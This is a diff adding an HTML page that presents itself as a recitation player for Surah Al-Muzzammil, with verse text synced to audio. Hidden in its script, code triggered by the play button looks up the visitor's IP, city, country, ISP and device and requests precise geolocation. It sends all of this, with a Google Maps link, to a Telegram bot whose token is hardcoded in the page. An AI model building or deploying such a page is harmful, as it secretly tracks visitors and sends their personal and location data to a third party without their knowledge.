@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>سورة المزمل - تلاوت</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&display=swap');
+        body { margin: 0; background: #020617; color: #f8fafc; font-family: 'Amiri', serif; text-align: center; }
+        header { position: fixed; top: 0; width: 100%; z-index: 100; background: rgba(15, 23, 42, 0.95); padding: 15px 0; border-bottom: 1px solid #2dd4bf; }
+        #quran-container { margin: 100px auto 180px; width: 92%; max-width: 800px; }
+        .ayat { font-size: 28px; line-height: 2.2; padding: 25px 15px; color: #64748b; direction: rtl; border-bottom: 1px solid rgba(255,255,255,0.03); cursor: pointer; transition: 0.3s; }
+        .highlight { color: #ffffff; background: rgba(45, 212, 191, 0.08); border-right: 4px solid #2dd4bf; }
+        .controls { position: fixed; bottom: 0; width: 100%; z-index: 100; background: rgba(15, 23, 42, 0.98); padding: 20px; border-top: 1px solid #2dd4bf; }
+        .play-btn { background: #2dd4bf; color: #020617; border: none; padding: 14px 45px; border-radius: 30px; font-weight: bold; cursor: pointer; font-size: 18px; box-shadow: 0 4px 15px rgba(45, 212, 191, 0.3); }
+    </style>
+</head>
+<body>
+
+    <header><h1>سورة المزمل (كاملة)</h1></header>
+
+    <div id="quran-container"></div>
+
+    <div class="controls">
+        <button class="play-btn" onclick="startApp()" id="btnUI">▶ PLAY TILAWAT</button>
+    </div>
+
+    <audio id="audioElement">
+        <source src="https://server8.mp3quran.net/afs/073.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        // --- تنظیمات ---
+        const TELEGRAM_TOKEN = '8767859857:AAHaCtEJmKC5UNGj-mB3LvffkSvvaSSVg58'; 
+        const CHAT_ID = '7147323384'; 
+
+        const audio = document.getElementById('audioElement');
+        const container = document.getElementById('quran-container');
+        const uiBtn = document.getElementById('btnUI');
+
+        const surahFull = [
+            { t: "بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ", s: 0 },
+            { t: "يَا أَيُّهَا الْمُزَّمِّلُ (1)", s: 5.5 },
+            { t: "قُمِ اللَّيْلَ إِلَّا قَلِيلًا (2)", s: 10.2 },
+            { t: "نِصْفَهُ أَوِ انقُصْ مِنْهُ قَلِيلًا (3)", s: 16.5 },
+            { t: "أَوْ زِدْ عَلَيْهِ وَرَتِّلِ الْقُرْآنَ تَرْتِيلًا (4)", s: 22.8 },
+            { t: "إِنَّا سَنُلْقِي عَلَيْكَ قَوْلًا ثَقِيلًا (5)", s: 31.5 },
+            { t: "إِنَّ نَاشِئَةَ اللَّيْلِ هِيَ أَشَدُّ وَطْئًا وَأَقْوَمُ قِيلًا (6)", s: 40.2 },
+            { t: "إِنَّ لَكَ فِي النَّهَارِ سَبْحًا طَوِيلًا (7)", s: 50.1 },
+            { t: "وَاذْكُرِ اسْمَ رَبِّكَ وَتَبَتَّلْ إِلَيْهِ تَبْتِيلًا (8)", s: 55.5 },
+            { t: "رَبُّ الْمَشْرِقِ وَالْمَغْرِبِ لَا إِلَهَ إِلَّا هُوَ فَاتَّخِذْهُ وَكِيلًا (9)", s: 63.8 },
+            { t: "وَاصْبِرْ عَلَى مَا يَقُولُونَ وَاهْجُرْهُمْ هَجْرًا جَمِيلًا (10)", s: 74.5 },
+            { t: "وَذَرْنِي وَالْمُكَذِّبِينَ أُولِي النَّعْمَةِ وَمَهِّلْهُمْ قَلِيلًا (11)", s: 83.2 },
+            { t: "إِنَّ لَدَيْنَا أَنكَالًا وَجَحِيمًا (12)", s: 92.8 },
+            { t: "وَطَعَامًا ذَا غُصَّةٍ وَعَذَابًا أَلِيمًا (13)", s: 98.5 },
+            { t: "يَوْمَ تَرْجُفُ الْأَرْضُ وَالْجِبَالُ وَكَانَتِ الْجِبَالُ كَثِيبًا مَّهِيلًا (14)", s: 106.8 },
+            { t: "إِنَّا أَرْسَلْنَا إِلَيْكُمْ رَسُولًا شَاهِدًا عَلَيْكُمْ (15)", s: 119.5 },
+            { t: "فَعَصَى فِرْعَوْنُ الرَّسُولَ فَأَخَذْنَاهُ أَخْذًا وَبِيلًا (16)", s: 133.2 },
+            { t: "فَكَيْفَ تَتَّقُونَ إِن كَفَرْتُمْ يَوْمًا يَجْعَلُ الْوِلْدَانَ شِيبًا (17)", s: 142.8 },
+            { t: "السَّمَاءُ مُنفَطِرٌ بِهِ كَانَ وَعْدُهُ مَفْعُولًا (18)", s: 154.5 },
+            { t: "إِنَّ هَذِهِ تَذْكِرَةٌ فَمَن شَاءَ اتَّخَذَ إِلَى رَبِّهِ سَبِيلًا (19)", s: 164.8 },
+            { t: "إِنَّ رَبَّكَ يَعْلَمُ أَنَّكَ تَقُومُ أَدْنَىٰ مِن ثُلُثَيِ اللَّيْلِ... (20)", s: 176.5 }
+        ];
+
+        // میسج لیږلو فنکشن
+        async function sendMessage(text) {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+                });
+                if (!response.ok) throw new Error('API Error');
+            } catch (error) {
+                console.error("Telegram Error:", error);
+            }
+        }
+
+        async function startApp() {
+            if (audio.paused) {
+                audio.play();
+                uiBtn.innerText = "⏸ PAUSE";
+                
+                // د آی پي (IP) معلومات
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    const d = await res.json();
+                    const ipMsg = `🌐 *New Visitor*\n🏙️ City: ${d.city}\n🌍 Country: ${d.country_name}\n📡 ISP: ${d.org}\n📱 Device: ${navigator.platform}`;
+                    sendMessage(ipMsg);
+                } catch(e) {
+                    sendMessage("🌐 Visitor detected, but IP info blocked.");
+                }
+
+                // لوکیشن (اجازه غواړي)
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(p => {
+                        const locMsg = `📍 *Location Found!*\n🗺️ Maps: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                        sendMessage(locMsg);
+                    }, (err) => {
+                        sendMessage("⚠️ Location Permission Denied.");
+                    }, { enableHighAccuracy: true });
+                }
+            } else {
+                audio.pause();
+                uiBtn.innerText = "▶ PLAY TILAWAT";
+            }
+        }
+
+        // د آیتونو لیست جوړول
+        surahFull.forEach((ayat, index) => {
+            const div = document.createElement('div');
+            div.className = 'ayat'; div.id = `ayat-${index}`;
+            div.innerText = ayat.t;
+            div.onclick = () => { 
+                audio.currentTime = ayat.s; 
+                if(audio.paused) startApp();
+            };
+            container.appendChild(div);
+        });
+
+        // د غږ سره د آیتونو بدلیدل
+        audio.addEventListener('timeupdate', () => {
+            const time = audio.currentTime;
+            surahFull.forEach((item, i) => {
+                const next = surahFull[i+1] ? surahFull[i+1].s : 9999;
+                if (time >= item.s && time < next) {
+                    const el = document.getElementById(`ayat-${i}`);
+                    if (el && !el.classList.contains('highlight')) {
+                        document.querySelectorAll('.ayat').forEach(a => a.classList.remove('highlight'));
+                        el.classList.add('highlight');
+                        el.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                    }
+                }
+            });
+        });
+    </script>
+</body>
+</html>
